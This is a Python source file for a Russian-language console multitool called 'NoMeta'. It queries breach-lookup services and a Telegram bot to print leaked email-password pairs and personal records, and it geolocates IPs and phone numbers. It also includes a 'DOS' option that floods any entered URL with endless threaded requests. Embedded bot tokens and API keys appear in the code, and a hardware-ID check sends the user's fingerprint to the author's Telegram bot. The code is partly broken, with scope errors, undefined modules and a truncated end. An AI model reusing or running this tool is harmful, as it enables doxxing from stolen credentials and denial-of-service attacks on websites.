import os
import sys
import threading
import requests
import socket
import sqlite3
import time
from pystyle import *
import subprocess
import psutil
import GPUtil
import platform
import hashlib
import telebot
import requests
from pystyle import Colors, Write
import os
import platform
import asyncio
from pystyle import Colorate, Colors, Center, Write
import socket
import requests
import time
import subprocess
from telethon import TelegramClient, events
import pandas

def mail_search():
    current_theme = Colors.white_to_green
    API_URL = "https://api.proxynova.com/comb"
    LIMIT = 100

    def mail_leak(query):
        try:
            response = requests.get(f"{API_URL}?query={query}&start=0&limit={LIMIT}", allow_redirects=False)

            if response.status_code in {301, 302}:
                return [f"[ERROR] Переадресация обнаружена (HTTP {response.status_code})"]

            response.raise_for_status()
            data = response.json()
            return data.get("lines", ["[SORRY] Нет результатов."])

        except requests.RequestException as e:
            return [f"[ERROR]Ошибка при запросе: {e}"]

    def mail_leak_results(results):
        formatted_results = []
        for item in results:
            if ":" in item:
                email, password = item.split(":", 1)
                formatted_results.append(f"[+] MAIL: {email.strip()}\n [+] PASS: {password.strip()}")
            else:
                formatted_results.append(item)
        return "\n\n".join(formatted_results)

    def main():
        query = Write.Input("Введите почту: ", current_theme, interval=0.00000001)

        results = mail_leak(query)

        formatted_results = mail_leak_results(results)

        print("Результаты поиска: ")
        Write.Print(formatted_results, current_theme, interval=0.00000001)

def main2():
        last_search_time = 0

        current_theme = Colors.white_to_green

        def clear():
            system = platform.system()

            if system == 'Windows':
                os.system('cls')
            else:
                os.system('clear')

        def print_logo():
            logo = f"""                      
                            ,--.          ____   
                          ,--.'|        ,'  , `. 
                      ,--,:  : |     ,-+-,.' _ | 
                   ,`--.'`|  ' :  ,-+-. ;   , || 
                   |   :  :  | | ,--.'|'   |  ;| 
                   :   |   \ | :|   |  ,', |  ': 
                   |   : '  '; ||   | /  | |  || 
                   '   ' ;.    ;'   | :  | :  |, 
                   |   | | \   |;   . |  ; |--'  
                   '   : |  ; .'|   : |  | ,     
                   |   | '`--'  |   : '  |/      
                   '   : |      ;   | |`-'       
                   ;   |.'      |   ;/           
                   '---'        '---'            

        █████████████████████████████████████████████████
        ПРОСИМ ВАС КАК ВВЕЛИ СВОИ ДАННЫЕ НЕ НАЖИМАТЬ 
        ENTER ПОКА ВАС ЭТО НЕ ПОПРОСИТ ПРОГРАММА!!!

        """
            Write.Print(logo, Colors.white_to_green, interval=0.000005)

        def api_search(req):
            global last_search_time
            try:
                Write.Print(f"\n[INFO] Запрос: {req}", current_theme, interval=0.0001)
                current_time = time.time()
                if current_time - last_search_time < 60:
                    Write.Print("\n[!] HE TAK 4ACTO !\n", current_theme, interval=0.0001)
                    return

                url = "https://server.leakosint.com/"
                headers = {
                    "Content-Type": "application/json"
                }
                payload = {
                    "token": "6670452517:roWiHDpG",
                    "request": req,
                    "limit": 100,
                    "lang": "ru"
                }

                response = requests.post(url, json=payload, headers=headers)

                if response.status_code != 200:
                    Write.Print(f"\n[ERROR] Ошибка HTTP {response.status_code}: {response.reason}\n", current_theme,
                                interval=0.0001)
                    return
                data = response.json().get('List', {})

                if not data:
                    Write.Print("\n[NM] Ничего не найдено\n", current_theme, interval=0.0001)
                    return

                for database, info in data.items():
                    if "No results found" in database:
                        Write.Print("\n[NM] Ничего не найдено\n", current_theme, interval=0.0001)
                        break

                    Write.Print("\n[NM] База данных -!> ", current_theme, interval=0.0001)
                    Write.Print(database, Colors.white, interval=0.0001)
                    Write.Print("\n\n[NM] Описание -!> ", current_theme, interval=0.0001)
                    Write.Print(f"{info['InfoLeak']}\n", current_theme, interval=0.0001)

                    for record in info['Data']:
                        for key, value in record.items():
                            Write.Print(f"\n[NM] {key} -!> ", current_theme, interval=0.0001)
                            Write.Print(value, Colors.white, interval=0.0001)
                    print()

                last_search_time = current_time
            except Exception as e:
                Write.Print(f"\n[ERROR] Произошла ошибка: {e}\n", current_theme, interval=0.0001)

        current_theme = Colors.white_to_green

        def search_by_ip(ip_addr):
            api_key = 'fd25b9ec7c5d6e6fcff0b58abe8cdafe23fb580460ac996e6b2c99e7'
            url = f"https://api.ipdata.co/{ip_addr}?api-key={api_key}"

            try:
                response = requests.get(url)
                response.raise_for_status()
                data = response.json()

                for key, value in data.items():
                    if isinstance(value, dict):
                        Write.Print(f"[\n[NM] {key} ->", current_theme, interval=0.00005)
                        for sub_key, sub_value in value.items():
                            if isinstance(sub_value, dict):
                                Write.Print(f"\n[NM] {sub_key} ->", current_theme, interval=0.00005)
                                for sub_sub_key, sub_sub_value in sub_value.items():
                                    Write.Print(f"\n[NM]{sub_sub_key} -> {sub_sub_value}", current_theme,
                                                interval=0.00005)
                            elif isinstance(sub_value, list) and all(isinstance(i, dict) for i in sub_value):
                                Write.Print(f"\n[NM] {sub_key} ->", current_theme, interval=0.00005)
                                for item in sub_value:
                                    for item_key, item_value in item.items():
                                        Write.Print(f"\n[NM] {item_key} -> {item_value}", current_theme,
                                                    interval=0.00005)
                            else:
                                Write.Print(f"\n[NM] {sub_key} -> {sub_value}", current_theme, interval=0.00005)
                    elif isinstance(value, list) and all(isinstance(i, dict) for i in value):
                        Write.Print(f"\n[NM] {key} ->", current_theme, interval=0.00005)
                        for item in value:
                            for item_key, item_value in item.items():
                                Write.Print(f"\n[NM] {item_key} -> {item_value}", current_theme, interval=0.00005)
                    else:
                        Write.Print(f"\n[NM] {key} -> {value}", current_theme, interval=0.00005)

            except requests.exceptions.RequestException as e:
                Write.Print(f"\n[ERROR] Ошибка при выполнении запроса: {e}", current_theme, interval=0.00005)

        while True:
            clear()
            banner = r'''
                      ███████   █████ ██████   ██████
                      ░░██████ ░░███ ░░██████ ██████ 
                       ░███░███ ░███  ░███░█████░███ 
                       ░███░░███░███  ░███░░███ ░███ 
                       ░███ ░░██████  ░███ ░░░  ░███ 
                       ░███  ░░█████  ░███      ░███ 
                       █████  ░░█████ █████     █████
                      ░░░░░    ░░░░░ ░░░░░     ░░░░░  
                             BY @nometadone 
                               MAIN MENU         
                 ┌─────────────────────────────────────────┐          
                 │  1 Search By NoMeta                     │      
                 │  2 Search By Scorpion                   │
                 │  3 Search By Proxy Nova                 │
                 │  4 Search By HTMLWEB                    │ 
                 │  5 Search By Local Data Base            │
                 │  6 Search By IP                         │
                 └─────────────────────────────────────────┘         

              ┌────────────────────────────────────────────────┐
              │   q | Exit               i | Information       │
              └────────────────────────────────────────────────┘

            '''

            print(Colorate.Vertical(Colors.white_to_green, Center.XCenter(banner)))

            select = Write.Input(f'>> ', current_theme, interval=0.005)
            if select == 'q':
                subprocess.run(["python", "main.py"])
                break
            elif select == 'i':
                Write.Print("""
                Отказ от ответственности
        Внимание: Данная мультитул утилита предоставляется исключительно для информационных и образовательных целей. Все инструменты, включенные в эту утилиту, предназначены для использования в рамках законных и этичных практик.

        Юридическая ответственность: Пользователь берет на себя полную ответственность за соблюдение всех применимых законов и нормативных актов в юрисдикции, в которой используется данная утилита. Любое использование программного обеспечения для незаконных, неэтичных или несанкционированных действий строго запрещено.

        Авторство и ответственность: Разработчики и авторы данной утилиты не несут ответственности за любой ущерб, утрату данных или последствия, вызванные использованием этой программы. Пользователь соглашается с тем, что он сам несет всю ответственность за любые действия, совершенные с использованием данной утилиты.

        Уведомление: Некоторые инструменты могут собирать, обрабатывать или передавать данные, использование которых регулируется законами о конфиденциальности и безопасности данных. Пользователь обязан убедиться в том, что все действия, совершаемые с помощью этой утилиты, соответствуют законодательству и не нарушают прав третьих лиц.

        Ограничение ответственности: Данная утилита предоставляется "как есть", без каких-либо гарантий, явных или подразумеваемых. Разработчики не гарантируют точности, надежности или корректности работы утилиты и не несут ответственности за любой ущерб, возникший в результате использования утилиты.

        Согласие: Приобретая и используя эту утилиту, вы подтверждаете свое согласие с вышеуказанными условиями. Незнание или непонимание данных условий не освобождает вас от ответственности за любые нарушения закона или прав третьих лиц, которые могут возникнуть в результате использования этой утилиты.
                """, current_theme, interval=0.005)
                input('\n Enter to Restart')
            elif select == '1':
                print_logo()
                api_search(Write.Input(f'[@] Введите запрос: ', current_theme, interval=0.005))
                input('\n Enter to Restart')
            elif select == '2':
                searchbyscorp()
                input('\n Enter to Restart')
            elif select == '3':
                print_logo()
                main()
                input('\n Enter to Restart')
            elif select == '4':
                print_logo()
                search_by_htmlweb(Write.Input(f'[@] Введите запрос: ', current_theme, interval=0.005))
                input('\n Enter to Restart')
            elif select == '5':
                print_logo()
                file_path = Write.Input("[@]Введите путь к файлу: ", current_theme, interval=0.005)
                search_term = Write.Input("[#]Введите поисковый запрос: ", current_theme, interval=0.005)
                universal_search(file_path, search_term)
                input('\n Enter to Restart')
            elif select == '6':
                ip_input = Write.Input("[@] Введите айпи: ", current_theme, interval=0.005)
                search_by_ip(ip_input)
                input('\n Enter to Restart')
def main3():
    current_theme = Colors.white_to_green

    def clear():
        if os.name == 'nt':
            os.system('cls')
        else:
            os.system('clear')
            sys.stdout.write("\x1b[8;40;140t")

    def get_ascii_value():
        symbol = input(f"{COLOR_CODE['RED']}{COLOR_CODE['BOLD']}Введите символ >> ")
        char_ASCII = ord(symbol)
        print(
            f"{COLOR_CODE['RED']}{COLOR_CODE['BOLD']}Значение ASCII для {COLOR_CODE['YELLOW']}'{symbol}' {COLOR_CODE['RED']}равно [ {COLOR_CODE['YELLOW']}{char_ASCII}{COLOR_CODE['RED']} ]")
        input(f'{COLOR_CODE["RED"]}{COLOR_CODE["BOLD"]}\nНажмите Enter, чтобы продолжить...')
        clear()

    def dos():
        link = input('Введите ссылку: ')

        def attack():
            while True:
                requests.get(link)

        while True:
            threading.Thread(target=attack).start()

    def convert_to_bits(input_str):
        units = {'tb': 1e12, 'gb': 1e9, 'mb': 1e6, 'kb': 1e3, 'b': 1, 'bit': 0.125}
        input_parts = input_str.split()
        if len(input_parts) == 2:
            input_value, input_unit = float(input_parts[0]), input_parts[1].lower()
            if input_unit in units:
                bytes_value = input_value * units[input_unit]
                kilobytes = bytes_value / 1024
                megabytes = kilobytes / 1024
                gigabytes = megabytes / 1024
                terabytes = gigabytes / 1024
                bits = bytes_value * 8
                print(" ")
                print(
                    f"                   {COLOR_CODE['RED']}{COLOR_CODE['BOLD']}     {COLOR_CODE['RED']}{COLOR_CODE['BOLD']}= {terabytes:.2f} TB")
                print(
                    f"                   {COLOR_CODE['RED']}{COLOR_CODE['BOLD']}     {COLOR_CODE['RED']}{COLOR_CODE['BOLD']}= {gigabytes:.2f} GB")
                print(
                    f"                   {COLOR_CODE['RED']}{COLOR_CODE['BOLD']}     {COLOR_CODE['RED']}{COLOR_CODE['BOLD']}= {megabytes:.2f} MB")
                print(
                    f"                   {COLOR_CODE['RED']}{COLOR_CODE['BOLD']}     {COLOR_CODE['RED']}{COLOR_CODE['BOLD']}= {kilobytes:.2f} KB")
                print(
                    f"                   {COLOR_CODE['RED']}{COLOR_CODE['BOLD']}     {COLOR_CODE['RED']}{COLOR_CODE['BOLD']}= {bytes_value:.2f} B")
                print(
                    f"                   {COLOR_CODE['RED']}{COLOR_CODE['BOLD']}     {COLOR_CODE['RED']}{COLOR_CODE['BOLD']}= {bits:.2e} bit")
            else:
                print(
                    f"                   {COLOR_CODE['RED']}{COLOR_CODE['BOLD']}Неверная единица измерения. Пожалуйста, используйте TB, GB, MB, KB, B или bit.")
        else:
            print(
                f"                   {COLOR_CODE['RED']}{COLOR_CODE['BOLD']}Неверный формат ввода. Введите значение и единицу измерения через пробел.")
        input(
            f'{COLOR_CODE["RED"]}{COLOR_CODE["BOLD"]}\n                   {COLOR_CODE["RED"]}{COLOR_CODE["BOLD"]}Нажмите Enter, чтобы вернуться в меню')

    def transform_text(input_text):
        translit_dict = {
            'а': 'a', 'б': 'b', 'в': 'v', 'г': 'g', 'д': 'd', 'е': 'e', 'ё': 'yo', 'ж': 'zh', 'з': 'z', 'и': 'i',
            'й': 'y', 'к': 'k', 'л': 'l', 'м': 'm', 'н': 'n', 'о': 'o', 'п': 'p', 'р': 'r', 'с': 's', 'т': 't',
            'у': 'u', 'ф': 'f', 'х': 'kh', 'ц': 'ts', 'ч': 'ch', 'ш': 'sh', 'щ': 'shch', 'ъ': '', 'ы': 'y',
            'ь': '', 'э': 'e', 'ю': 'yu', 'я': 'ya',
            'А': 'A', 'Б': 'B', 'В': 'V', 'Г': 'G', 'Д': 'D', 'Е': 'E', 'Ё': 'Yo', 'Ж': 'Zh', 'З': 'Z', 'И': 'I',
            'Й': 'Y', 'К': 'K', 'Л': 'L', 'М': 'M', 'Н': 'N', 'О': 'O', 'П': 'P', 'Р': 'R', 'С': 'S', 'Т': 'T',
            'У': 'U', 'Ф': 'F', 'Х': 'Kh', 'Ц': 'Ts', 'Ч': 'Ch', 'Ш': 'Sh', 'Щ': 'Shch', 'Ъ': '', 'Ы': 'Y',
            'Ь': '', 'Э': 'E', 'Ю': 'Yu', 'Я': 'Ya'
        }
        transformed_text = []
        for char in input_text:
            if char in translit_dict:
                transformed_text.append(translit_dict[char])
            else:
                transformed_text.append(char)
        return ''.join(transformed_text)

    def print_logo():
        logo = f"""                      
                        ,--.          ____   
                      ,--.'|        ,'  , `. 
                  ,--,:  : |     ,-+-,.' _ | 
               ,`--.'`|  ' :  ,-+-. ;   , || 
               |   :  :  | | ,--.'|'   |  ;| 
               :   |   \ | :|   |  ,', |  ': 
               |   : '  '; ||   | /  | |  || 
               '   ' ;.    ;'   | :  | :  |, 
               |   | | \   |;   . |  ; |--'  
               '   : |  ; .'|   : |  | ,     
               |   | '`--'  |   : '  |/      
               '   : |      ;   | |`-'       
               ;   |.'      |   ;/           
               '---'        '---'            

    █████████████████████████████████████████████████
    ПРОСИМ ВАС КАК ВВЕЛИ СВОИ ДАННЫЕ НЕ НАЖИМАТЬ 
    ENTER ПОКА ВАС ЭТО НЕ ПОПРОСИТ ПРОГРАММА!!!

    """
        Write.Print(logo, Colors.white_to_green, interval=0.000005)

    while True:
        clear()
        banner = r'''
                  ███████   █████ ██████   ██████
                  ░░██████ ░░███ ░░██████ ██████ 
                   ░███░███ ░███  ░███░█████░███ 
                   ░███░░███░███  ░███░░███ ░███ 
                   ░███ ░░██████  ░███ ░░░  ░███ 
                   ░███  ░░█████  ░███      ░███ 
                   █████  ░░█████ █████     █████
                  ░░░░░    ░░░░░ ░░░░░     ░░░░░  
                         BY @nometadone 
                           MAIN MENU         
             ┌─────────────────────────────────────────┐          
             │  1 | MEMORY SIZE                        │      
             │  2 | FORM TEXT                          │
             │  3 | ASCII VALUE                        │
             │  4 | DOS                                │ 
             └─────────────────────────────────────────┘         

          ┌────────────────────────────────────────────────┐
          │   q | Exit               i | Information       │
          └────────────────────────────────────────────────┘

        '''
        print(Colorate.Vertical(Colors.white_to_green, Center.XCenter(banner)))

        select = Write.Input(f'>> ', current_theme, interval=0.005)

        if select == '1':
            print_logo()
            input_str = input(f"Введите значение и единицу измерения (например, '1 TB') >> ")
            convert_to_bits(input_str)
            input('\n Enter to Restart')
        elif select == '2':
            print_logo()
            input_text = input(f'Введите текст >> ')
            transformed_text = transform_text(input_text)
            print(f'Готовый текст >> {transformed_text}')
            input('\n Enter to Restart')
        elif select == '3':
            print_logo()
            input_str = input("Введите значение и единицу измерения (например, '1 GB'): ")
            convert_to_bits(input_str)
            input('\n Enter to Restart')
        elif select == '4':
            dos()
        elif select == 'q':
            subprocess.run(["python", "main.py"])
            break
        elif select == 'i':
            Write.Print("""
                Отказ от ответственности
        Внимание: Данная мультитул утилита предоставляется исключительно для информационных и образовательных целей. Все инструменты, включенные в эту утилиту, предназначены для использования в рамках законных и этичных практик.

        Юридическая ответственность: Пользователь берет на себя полную ответственность за соблюдение всех применимых законов и нормативных актов в юрисдикции, в которой используется данная утилита. Любое использование программного обеспечения для незаконных, неэтичных или несанкционированных действий строго запрещено.

        Авторство и ответственность: Разработчики и авторы данной утилиты не несут ответственности за любой ущерб, утрату данных или последствия, вызванные использованием этой программы. Пользователь соглашается с тем, что он сам несет всю ответственность за любые действия, совершенные с использованием данной утилиты.

        Уведомление: Некоторые инструменты могут собирать, обрабатывать или передавать данные, использование которых регулируется законами о конфиденциальности и безопасности данных. Пользователь обязан убедиться в том, что все действия, совершаемые с помощью этой утилиты, соответствуют законодательству и не нарушают прав третьих лиц.

        Ограничение ответственности: Данная утилита предоставляется "как есть", без каких-либо гарантий, явных или подразумеваемых. Разработчики не гарантируют точности, надежности или корректности работы утилиты и не несут ответственности за любой ущерб, возникший в результате использования утилиты.

        Согласие: Приобретая и используя эту утилиту, вы подтверждаете свое согласие с вышеуказанными условиями. Незнание или непонимание данных условий не освобождает вас от ответственности за любые нарушения закона или прав третьих лиц, которые могут возникнуть в результате использования этой утилиты.
                """, current_theme, interval=0.005)
            input('\n Enter to Restart')

def searchbydb():
    def format_output(file_path, nm, keys, values):
        formatted_lines = []
        for i, (key, value) in enumerate(zip(keys, values)):
            clean_value = str(value).replace(';', '\n').replace('\n', ' ')
            formatted_lines.append(f"{key}: {clean_value}")
        return f"[Файл: {file_path} | Строка: {nm}]\n" + "\n".join(formatted_lines) + "\n" + '-' * 50

    def search_in_txt(file_path, search_term):
        found = 0
        with open(file_path, 'r', encoding='utf-8') as file:
            lines = file.readlines()
            for i, line in enumerate(lines, start=1):
                if search_term.lower() in line.lower():
                    formatted_line = format_output(file_path, i, ["Строка"], [line.strip()])
                    Write.Print(f"\n🔍 Найдено в {file_path}:\n{formatted_line}", Colors.white_to_green)
                    time.sleep(0.00005)
                    found += 1
        if found == 0:
            Write.Print(f"\n❌ По запросу '{search_term}' ничего не найдено в файле {file_path}.", Colors.white_to_green)
        else:
            Write.Print(f"\n✅ Найдено совпадений: {found}", Colors.white_to_green)

    def search_in_csv(file_path, search_term):
        found = 0
        with open(file_path, mode='r', encoding='utf-8') as file:
            reader = csv.reader(file, delimiter=';')
            headers = next(reader, None)
            for i, row in enumerate(reader, start=2):
                if search_term.lower() in ';'.join(row).lower():
                    formatted_output = format_output(file_path, i, headers, row)
                    Write.Print(f"\n🔍 Найдено в {file_path}:\n{formatted_output}", Colors.white_to_green)
                    time.sleep(0.00005)
                    found += 1
        if found == 0:
            Write.Print(f"\n❌ По запросу '{search_term}' ничего не найдено в файле {file_path}.", Colors.white_to_green)
        else:
            Write.Print(f"\n✅ Найдено совпадений: {found}", Colors.white_to_green)

    def search_in_xlsx(file_path, search_term):
        found = 0
        xlsx = pd.ExcelFile(file_path)
        for sheet_name in xlsx.sheet_names:
            df = pd.read_excel(xlsx, sheet_name=sheet_name)
            for index, row in df.iterrows():
                keys = df.columns
                values = row
                if any(search_term.lower() in str(value).lower() for value in values):
                    formatted_output = format_output(file_path, index + 1, keys, values)
                    Write.Print(f"\n🔍 Найдено в {file_path}, лист {sheet_name}:\n{formatted_output}",
                                Colors.white_to_green)
                    time.sleep(0.00005)
                    found += 1
        if found == 0:
            Write.Print(f"\n❌ По запросу '{search_term}' ничего не найдено в файле {file_path}.", Colors.white_to_green)
        else:
            Write.Print(f"\n✅ Найдено совпадений: {found}", Colors.white_to_green)

    def search_in_sql(file_path, search_term):
        found = 0
        conn = sqlite3.connect(file_path)
        cursor = conn.cursor()
        cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
        tables = cursor.fetchall()
        for table in tables:
            query = f"SELECT * FROM {table[0]}"
            cursor.execute(query)
            rows = cursor.fetchall()
            col_names = [description[0] for description in cursor.description]
            for i, row in enumerate(rows, start=1):
                keys = col_names
                values = row
                if search_term.lower() in ' '.join(map(str, values)).lower():
                    formatted_output = format_output(file_path, i, keys, values)
                    Write.Print(f"\n🔍 Найдено в {file_path}, таблица {table[0]}:\n{formatted_output}",
                                Colors.white_to_green)
                    time.sleep(0.00005)  # Интервал
                    found += 1
        conn.close()
        if found == 0:
            Write.Print(f"\n❌ По запросу '{search_term}' ничего не найдено в базе данных {file_path}.",
                        Colors.white_to_green)
        else:
            Write.Print(f"\n✅ Найдено совпадений: {found}", Colors.white_to_green)

    def universal_search(file_path, search_term):
        start_time = time.time()
        if file_path.endswith('.txt'):
            search_in_txt(file_path, search_term)
        elif file_path.endswith('.csv'):
            search_in_csv(file_path, search_term)
        elif file_path.endswith('.xlsx'):
            search_in_xlsx(file_path, search_term)
        elif file_path.endswith('.sql') or file_path.endswith('.db'):
            search_in_sql(file_path, search_term)
        else:
            Write.Print(f"\n❌ Формат файла {file_path} не поддерживается.", Colors.white_to_green)
        end_time = time.time()
        elapsed_time = end_time - start_time
        Write.Print(f"\n🕒 Время поиска: {elapsed_time:.2f} секунд", Colors.white_to_green)

def searchbyhtmlweb():
    def search_by_htmlweb(phone: str):
        try:
            url = f"https://htmlweb.ru/geo/api.php?json&telcod={phone}"
            res = requests.get(url, timeout=10)
            data = res.json()

            if '0' in data:
                info = data['0']

                country_data = data.get("country", {})
                if isinstance(country_data, dict):
                    for key, value in country_data.items():
                        Write.Print(f"\n[NM]{key} -!> {value}", current_theme, interval=0.0001)

                region_data = data.get("region", {})
                if isinstance(region_data, dict):
                    for key, value in region_data.items():
                        Write.Print(f"\n[NM]{key} -!> {value}", current_theme, interval=0.0001)

                if isinstance(info, dict):
                    for key, value in info.items():
                        Write.Print(f"\n[NM]{key} -!> {value}", current_theme, interval=0.0001)

            else:
                Write.Print("\nИнформация о номере не найдена.", Colors.red_to_white, interval=0.0001)

        except Exception as e:
            Write.Print('\nВ ходе сканирования произошла ошибка!', Colors.red_to_white, interval=0.0001)
            print(str(e))

def searchbyscorp():
    api_id = '25812027'
    api_hash = 'c240a94b40c3af9ce927a0fe30730ccb'
    bot_username = '@scorpion_network_bot'

    def print_logo():
        logo = f"""                      
                        ,--.          ____   
                      ,--.'|        ,'  , `. 
                  ,--,:  : |     ,-+-,.' _ | 
               ,`--.'`|  ' :  ,-+-. ;   , || 
               |   :  :  | | ,--.'|'   |  ;| 
               :   |   \ | :|   |  ,', |  ': 
               |   : '  '; ||   | /  | |  || 
               '   ' ;.    ;'   | :  | :  |, 
               |   | | \   |;   . |  ; |--'  
               '   : |  ; .'|   : |  | ,     
               |   | '`--'  |   : '  |/      
               '   : |      ;   | |`-'       
               ;   |.'      |   ;/           
               '---'        '---'            

    █████████████████████████████████████████████████

    """
        Write.Print(logo, Colors.white_to_green, interval=0.005)

    async def search():
        print_logo()

        client = TelegramClient('session_name', api_id, api_hash)
        await client.start()

        loop = asyncio.get_event_loop()
        bot_message = await loop.run_in_executor(None, lambda: input("[NM] Введите запрос -!> "))

        await client.send_message(bot_username, bot_message)
        search_message = await client.send_message(bot_username, '⏳ Идет поиск, ожидайте...')

        @client.on(events.NewMessage(chats=bot_username))
        async def handler(event):
            message = event.message

            if '⏳ Идет поиск, ожидайте...' in message.text:
                Write.Print("[INFO] Идет поиск...\n", Colors.white_to_green, interval=0.000005)
                return

            Write.Print(f"[NM] RESULT -!> \n: {message.text}", Colors.white_to_green, interval=0.000005)

            if message.media and message.media.document:
                document = message.media.document
                if document.mime_type == 'text/html':
                    file_path = await client.download_media(message, file='searchbyscorpion.html')
                    Write.Print(f"\nHTML файл скачан: {file_path}", Colors.white_to_green, interval=0.000005)
                else:
                    Write.Print("\nПрикрепленный файл не является HTML.", Colors.white_to_green, interval=0.000005)
            else:
                Write.Print(f"[NM] RESULT - !> \n{message.text}", Colors.white_to_green, interval=0.000005)

            await client.delete_messages(bot_username, search_message.id)
            await client.disconnect()

        await client.run_until_disconnected()

COLOR_CODE = {
    "RESET": "\033[0m",
    "UNDERLINE": "\033[04m",
    "GREEN": "\033[32m",
    "YELLOW": "\033[93m",
    "RED": "\033[31m",
    "CYAN": "\033[36m",
    "BOLD": "\033[01m",
    "PINK": "\033[95m",
    "URL_L": "\033[36m",
    "LI_G": "\033[92m",
    "F_CL": "\033[0m",
    "DARK": "\033[90m",
    "BLUE": "\033[1;34m",
}
current_theme = Colors.white_to_green


def Hwid():
    cpu_name = platform.processor()
    try:
        cpu_freq = psutil.cpu_freq().current if psutil.cpu_freq() else 'N/A'
    except:
        cpu_freq = 'N/A'
    try:
        gpus = GPUtil.getGPUs()
        gpu_name = gpus[0].name if gpus else 'N/A'
    except:
        gpu_name = 'N/A'
    try:
        ram_info = psutil.virtual_memory()
        ram_total = round(ram_info.total / (1024 ** 3), 2)
    except:
        ram_total = 'N/A'
    try:
        os_name = platform.system() + " " + platform.release()
    except:
        os_name = 'N/A'

    hwid = hashlib.sha256(
        f"{cpu_name} -> {cpu_freq} MHz -> {gpu_name} -> {ram_total} GB -> {os_name}".encode()).hexdigest()
    hwid_safe = hwid.replace('_', '\\_').replace('*', '\\*').replace('[', '\\[').replace(']', '\\]').replace('`', '\\`')
    bot = telebot.TeleBot("7112104527:AAGxRzkLnRBn4xhpszPLO3w-IBNx8k8LUjM")
    sent = False
    while True:
        url = "https://raw.githubusercontent.com/jumaysimbaperhet/nomuty/refs/heads/main/NOMETAPREMIUM/HWIDS"
        hwid_list = requests.get(url).text.splitlines()
        if hwid.strip() in [line.strip() for line in hwid_list]:
            Write.Print("[OK] Вы прошли проверку, доступ разрешен!\n", Colors.green_to_white, interval=0.01)
            break
        else:
            if not sent:
                os.system("cls" if platform.system() == "Windows" else "clear")
                sender = Write.Input("[№] Введите свой телеграм никнейм (с @) -> ", Colors.green_to_white,
                                     interval=0.005)
                subscription = Write.Input("[№] Введите откуда узнали об NoMeta (для статистики) -> ",
                                           Colors.green_to_white, interval=0.005)
                bot.send_message(6848268652, f"{sender} отправил HWID на {subscription}:\n`{hwid_safe}`",
                                 parse_mode='MarkdownV2')
                sent = True
                Write.Print("[!] Вы отправлены на проверку, ожидайте...\n", Colors.yellow_to_red, interval=0.01)


Hwid()

def clear():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
        sys.stdout.write("\x1b[8;40;140t")


def get_ascii_value():
    symbol = input(f"{COLOR_CODE['RED']}{COLOR_CODE['BOLD']}Введите символ >> ")
    char_ASCII = ord(symbol)
    print(
        f"{COLOR_CODE['RED']}{COLOR_CODE['BOLD']}Значение ASCII для {COLOR_CODE['YELLOW']}'{symbol}' {COLOR_CODE['RED']}равно [ {COLOR_CODE['YELLOW']}{char_ASCII}{COLOR_CODE['RED']} ]")
    input(f'{COLOR_CODE["RED"]}{COLOR_CODE["BOLD"]}\nНажмите Enter, чтобы продолжить...')
    clear()


def dos():
    link = input('Введите ссылку: ')

    def attack():
        while True:
            requests.get(link)

    while True:
        threading.Thread(target=attack).start()

def convert_to_bits(input_str):
    units = {'tb': 1e12, 'gb': 1e9, 'mb': 1e6, 'kb': 1e3, 'b': 1, 'bit': 0.125}
    input_parts = input_str.split()
    if len(input_parts) == 2:
        input_value, input_unit = float(input_parts[0]), input_parts[1].lower()
        if input_unit in units:
            bytes_value = input_value * units[input_unit]
            kilobytes = bytes_value / 1024
            megabytes = kilobytes / 1024
            gigabytes = megabytes / 1024
            terabytes = gigabytes / 1024
            bits = bytes_value * 8
            print(" ")
            print(
                f"                   {COLOR_CODE['RED']}{COLOR_CODE['BOLD']}     {COLOR_CODE['RED']}{COLOR_CODE['BOLD']}= {terabytes:.2f} TB")
            print(
                f"                   {COLOR_CODE['RED']}{COLOR_CODE['BOLD']}     {COLOR_CODE['RED']}{COLOR_CODE['BOLD']}= {gigabytes:.2f} GB")
            print(
                f"                   {COLOR_CODE['RED']}{COLOR_CODE['BOLD']}     {COLOR_CODE['RED']}{COLOR_CODE['BOLD']}= {megabytes:.2f} MB")
            print(
                f"                   {COLOR_CODE['RED']}{COLOR_CODE['BOLD']}     {COLOR_CODE['RED']}{COLOR_CODE['BOLD']}= {kilobytes:.2f} KB")
            print(
                f"                   {COLOR_CODE['RED']}{COLOR_CODE['BOLD']}     {COLOR_CODE['RED']}{COLOR_CODE['BOLD']}= {bytes_value:.2f} B")
            print(
                f"                   {COLOR_CODE['RED']}{COLOR_CODE['BOLD']}     {COLOR_CODE['RED']}{COLOR_CODE['BOLD']}= {bits:.2e} bit")
        else:
            print(
                f"                   {COLOR_CODE['RED']}{COLOR_CODE['BOLD']}Неверная единица измерения. Пожалуйста, используйте TB, GB, MB, KB, B или bit.")
    else:
        print(
            f"                   {COLOR_CODE['RED']}{COLOR_CODE['BOLD']}Неверный формат ввода. Введите значение и единицу измерения через пробел.")
    input(
        f'{COLOR_CODE["RED"]}{COLOR_CODE["BOLD"]}\n                   {COLOR_CODE["RED"]}{COLOR_CODE["BOLD"]}Нажмите Enter, чтобы вернуться в меню')


def transform_text(input_text):
    translit_dict = {
        'а': 'a', 'б': 'b', 'в': 'v', 'г': 'g', 'д': 'd', 'е': 'e', 'ё': 'yo', 'ж': 'zh', 'з': 'z', 'и': 'i',
        'й': 'y', 'к': 'k', 'л': 'l', 'м': 'm', 'н': 'n', 'о': 'o', 'п': 'p', 'р': 'r', 'с': 's', 'т': 't',
        'у': 'u', 'ф': 'f', 'х': 'kh', 'ц': 'ts', 'ч': 'ch', 'ш': 'sh', 'щ': 'shch', 'ъ': '', 'ы': 'y',
        'ь': '', 'э': 'e', 'ю': 'yu', 'я': 'ya',
        'А': 'A', 'Б': 'B', 'В': 'V', 'Г': 'G', 'Д': 'D', 'Е': 'E', 'Ё': 'Yo', 'Ж': 'Zh', 'З': 'Z', 'И': 'I',
        'Й': 'Y', 'К': 'K', 'Л': 'L', 'М': 'M', 'Н': 'N', 'О': 'O', 'П': 'P', 'Р': 'R', 'С': 'S', 'Т': 'T',
        'У': 'U', 'Ф': 'F', 'Х': 'Kh', 'Ц': 'Ts', 'Ч': 'Ch', 'Ш': 'Sh', 'Щ': 'Shch', 'Ъ': '', 'Ы': 'Y',
        'Ь': '', 'Э': 'E', 'Ю': 'Yu', 'Я': 'Ya'
    }
    transformed_text = []
    for char in input_text:
        if char in translit_dict:
            transformed_text.append(translit_dict[char])
        else:
            transformed_text.append(char)
    return ''.join(transformed_text)
intro = """
                             ██████   █████          ██████   ██████           █████             
